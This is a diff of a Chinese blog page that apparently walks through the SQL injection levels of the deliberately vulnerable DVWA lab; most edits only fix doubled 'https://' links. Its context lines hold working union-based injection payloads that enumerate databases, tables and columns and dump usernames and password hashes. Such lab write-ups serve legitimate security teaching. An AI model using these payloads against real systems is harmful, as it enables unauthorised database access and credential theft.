@@ -3,10 +3,10 @@
     <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>DVWA之SQL Injection | Gridea</title>
-<link rel="shortcut icon" href="https://https://jinqipiaopiao.github.io//favicon.ico?v=1624177818252">
+<link rel="shortcut icon" href="https://jinqipiaopiao.github.io//favicon.ico?v=1624178139382">
 <link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
-<link rel="stylesheet" href="https://https://jinqipiaopiao.github.io//styles/main.css">
-<link rel="alternate" type="application/atom+xml" title="DVWA之SQL Injection | Gridea - Atom Feed" href="https://https://jinqipiaopiao.github.io//atom.xml">
+<link rel="stylesheet" href="https://jinqipiaopiao.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="DVWA之SQL Injection | Gridea - Atom Feed" href="https://jinqipiaopiao.github.io//atom.xml">
 <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
 
 
@@ -22,8 +22,8 @@
     <div class="main">
       <div class="main-content">
         <div class="site-header">
-  <a href="https://https://jinqipiaopiao.github.io/">
-  <img class="avatar" src="https://https://jinqipiaopiao.github.io//images/avatar.png?v=1624177818252" alt="">
+  <a href="https://jinqipiaopiao.github.io/">
+  <img class="avatar" src="https://jinqipiaopiao.github.io//images/avatar.png?v=1624178139382" alt="">
   </a>
   <h1 class="site-title">
     Gridea
@@ -123,19 +123,19 @@ if( isset( $_REQUEST[ 'Submit' ] ) ) {
 <p>也可以 1’ or ‘1’=’1 闭合后面单引号，同样可以达到目的。</p>
 <p>3.判断字段数，输入 1’ order by x # (x=2,3) 得到字段数为2。</p>
 <p>4.查询回显字段，输入 -1’ union select 1,2 # ,得到回显字段<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1617012378886.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1617012378886.png" alt="" loading="lazy"><br>
 5.查询数据库名，输入 -1’ union select 1,database() # ,<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1617012408741.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1617012408741.png" alt="" loading="lazy"><br>
 得到数据库为 dvwa。</p>
 <p>6.-1’ union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()) #</p>
 <p>查询表名：<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1617012509002.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1617012509002.png" alt="" loading="lazy"><br>
 7.-1’ union select 1,(select group_concat(column_name) from information_schema.columns where table_name=’users’) #</p>
 <p>查询列名：<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1617012613068.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1617012613068.png" alt="" loading="lazy"><br>
 8.-1’ union select 1,(select group_concat(user,’,’,password) from dvwa.users) #</p>
 <p>得到用户与密码：</p>
-<p><img src="https://https://jinqipiaopiao.github.io//post-images/1617012640558.png" alt="" loading="lazy"><br>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1617012640558.png" alt="" loading="lazy"><br>
 2.Medium</p>
 <?php
 
@@ -179,7 +179,7 @@ mysqli_close($GLOBALS["___mysqli_ston"]);
 </code></pre>
 <p>进行了转义。且改为了下拉菜单，防止在输入框中直接注入。<br>
 我们可以在burp抓包：<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1617024704788.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1617024704788.png" alt="" loading="lazy"><br>
 1.判断注入类型。</p>
 <p>报错：You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1</p>
 <p>得出位数值型注入。这下mysqli_real_escape_string函数对敏感字符进行的过滤显得比较鸡肋了，数值型注入id不需要用 ‘,”等进行闭合，直接注入即可。</p>
@@ -187,7 +187,7 @@ mysqli_close($GLOBALS["___mysqli_ston"]);
 <p>id=1 order by 2&amp;Submit=Submit 回显正常。</p>
 <p>id=1 order by 3&amp;Submit=Submit 错误，说明有2字段。</p>
 <p>3.判断回显。<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1617024765485.png" alt="" loading="lazy"></p>
+<img src="https://jinqipiaopiao.github.io//post-images/1617024765485.png" alt="" loading="lazy"></p>
 <p>4.查询数据库。</p>
 <p>id=-1 union select 1,database()&amp;Submit=Submit</p>
 <p>5.查询表名。</p>
@@ -227,7 +227,7 @@ if( isset( $_SESSION [ 'id' ] ) ) {
 
 ?> 
 <p>与medium相比，high级别多了一个limit 1，限制只输出一个结果。但可以通过#将其注释掉。</p>
-<figure data-type="image" tabindex="1"><img src="https://https://jinqipiaopiao.github.io//post-images/1617024809653.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="1"><img src="https://jinqipiaopiao.github.io//post-images/1617024809653.png" alt="" loading="lazy"></figure>
 <p>后面多了一个#注释。</p>
 <p>步骤同low基本（查询列名时table_name=’users’ 这里使用16进制绕过一下）</p>
 <pre><code>    4.Impossible
@@ -284,7 +284,7 @@ generateSessionToken();
         
           <div class="next-post">
             <div class="next">下一篇</div>
-            <a href="https://https://jinqipiaopiao.github.io/post/dvwa-zuo-ti-jie-xi/">
+            <a href="https://jinqipiaopiao.github.io/post/dvwa-zuo-ti-jie-xi/">
               <h3 class="post-title">
                 DVWA之Brute Force
               </h3>
@@ -296,7 +296,7 @@ generateSessionToken();
 
         <div class="site-footer">
   Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
-  <a class="rss" href="https://https://jinqipiaopiao.github.io//atom.xml" target="_blank">
+  <a class="rss" href="https://jinqipiaopiao.github.io//atom.xml" target="_blank">
     <i class="ri-rss-line"></i> RSS
   </a>
 </div>
